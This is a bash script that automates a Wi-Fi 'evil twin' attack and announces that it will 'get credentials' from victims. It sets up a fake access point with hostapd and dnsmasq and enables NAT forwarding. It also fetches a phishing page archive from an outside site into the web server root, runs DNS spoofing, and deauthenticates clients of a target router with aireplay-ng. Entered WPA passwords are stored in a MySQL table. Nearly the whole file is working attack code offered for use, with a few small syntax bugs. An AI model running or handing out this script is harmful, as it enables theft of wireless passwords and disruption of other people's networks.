clear
echo "This simple attack will allow you create a simple ap and get credentials!!!!!!"
sleep 1
echo "follow the given steps to create a fake ap"
sleep 2
echo "close the smaall pop-up window if it not asks you to install something"
sleep 1
echo "if it cant install the tools you have to install it yourself"
echo "Tool Installer"
xterm -hold -e ./install_tools.sh hostapd dnsmasq mysql  iptables 
clear
#################################################################
printf "\n----- INSTRUCTIONS -----\n\n"
sleep 5
echo "Make sure you have all the necessary tools installed"
sleep 2
echo "1)  for providing internet access to the connected victim,make sure you have 2 interfaces"
 
echo "2)  for eg wlan0 and eth"
sleep 1
echo "3)  1 card must support monitor mode"


echo "do you want to change your wireless card to monitor mode[1 or2]"
read choice
if [ $choice -eq '1' ];
then
        echo "enter your interface name"
        read interface
        sleep 1
        airmon-ng start $interface
        sleep 3
        echo "Enter your monitor mode interface : "
        read moninterface

else 
if [ $choice -eq '2' ];
then
        echo "Enter your monitor mode interface : "
        read moninterface
fi
fi
clear

echo "Time to set up the Evil Twin AP!!!"
sleep 2 
mkdir /root/fakeap 
cd /root/fakeap
read -p 'Fake AP Name': faname
if [ -z $faname ]
then
	echo "Name not set"
	exit 
else 
	echo "fake ap name $faname"
        echo "Enter the Channel: " 
        read etChannel 
        if [ -z $etChannel ] ; then 
                echo "Channel not set" 
		exit
        else 
                echo "channel name $etChannel" 
		echo "enter other interface(for eg eth0)"
		read eth
		if [-z $eth]; then							#if -z $writeFilePrefix ; then
			echo "other interface not set"
			exit
		else
			echo "other interface is $eth"
fi	fi	fi

echo"------------------------------------------------------------------------------"
echo -e " \033[0;31m ----- This information we will use for futher attacks-----"
echo "-----------------------------------------------------------------------------"
sleep 4
clear

echo "now we are writting some information into your hostapd and dnsmasq file"
sleep 3

cat  > hostapd.conf  << EOF &
interface=$moninterface
driver=nl80211
ssid=$faname
hw_mode=g
channel=$etChannel
macaddr_acl=0
ignore_broadcast_ssid=0
EOF
sleep 2 
cat > dnsmasq.conf <<EOF & 
interface=$moninterface
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF
sleep 1
echo "executing hostapd and dnsmasq in 3 new windows(you might have to drag to see whats going on)"
sleep 3
echo "after setting up fake ap we will create a mysql databae for storing our passwords"
echo "it will happen in the main window so when seeing 6 pop ups windows go to the main window "
sleep 1



xterm -hold -e hostapd hostapd.conf &
xterm -hold -e "ifconfig $moninterface up 192.168.1.1 netmask 255.255.255.0;route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1;dnsmasq -C dnsmasq.conf -d" &
xterm -hold -e "iptables --table nat --append POSTROUTING --out-interface $eth -j MASQUERADE;iptables --append FORWARD --in-interface $moninterface -j ACCEPT;echo 1 > /proc/sys/net/ipv4/ip_forward" &
xterm -hold -e "wget https://www.shellvoide.com/media/files/rogueap.zip;rm -rf /var/www/html/*;mv rogueap.zip /var/www/html/;cd /var/www/html/ ; unzip rogueap.zip;service apache2 start;service mysql start;dnssnoof -i $moninterface" &
gnome-terminal -x sh -c 'printf "Now we will get some info about the router\n";echo do note the bssid ;airodump-ng $moninterface ; exec bash'  &
gnome-terminal -x sh -c 'printf "Now we will deauth the target\n";echo Enter the bssid ;sleep 3;read bssid ;aireplay-ng -00 -a $bssid; exec bash'

echo "Enter the following in the mysql that will open up next"
echo "create database rogueap;" 
echo "create user rogueuser;"   
echo "grant all on rogueap.* to 'rogueuser'@'localhost' identified by 'roguepassword';"
echo "use rogueap;"
echo "create table wpa_keys(password1 varchar(30), password2 varchar(30));"
echo "ALTER DATABASE rogueap CHARACTER SET 'utf8';"
clear  
echo -e  "you can see the passwords by the end of the attack with this \033[0;32m  select * from wpa_keys;"
mysql 


